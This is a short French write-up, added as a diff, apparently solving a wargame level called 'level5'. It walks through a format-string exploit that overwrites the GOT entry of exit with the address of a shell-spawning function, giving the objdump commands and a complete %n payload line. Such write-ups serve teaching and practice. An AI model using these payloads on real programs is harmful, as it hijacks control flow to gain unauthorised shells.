@@ -1,0 +1,13 @@
+1. Nous voyons que nous avons un programme qui appelle une fonctions qui lit sur l'entree standard pour afficher et exit. Nous avons aussi une fonction orpheline qui permet d'executer un shell.
+2. Le but vas etre de pouvoir lancer cette fonction o. 
+3. En regardant sur le net, je vois qu'il est possible a travers une manipulation de payload, de surcharger l'adresse de la fonction exit grace au printf d'avant.
+4. Pour cela j'ai besoin de savoir sur quel position lit le printf -> echo "AAAA %x %x %x %x" | ./level5
+5. J'ai aussi besoin de l'adresse du exit et de celle de ma fonction o
+6. adresse de exit ``objdump -R ./level5 | grep exit`` -> 08049838
+7. adresse de la fonction o -> ``objdump -d ./level5 | grep "<o>"`` -> 080484a4
+8. L'adresse de la fonction o vaut 134513828 en decimal 
+9. (python -c "print('\x38\x98\x04\x08' + '%134513824x%4\$n')"; cat) | ./level5  -> voici donc ma ligne d'exploit
+10. Ma ligne d'exploit pas a pas: 
+    - "'\x38\x98\x04\x08" -> affiche et donc stocke l'adresse de exit (en position 4 de la stack)
+    - "%134513824x" -> affiche 134513824 de caractere
+    - %4\$n -> compte le total de caractere affiche -> qui vaut l'adresse de la fonction o -> et nous disons au printf ecris a l'adresse stocke position 4 de la stack
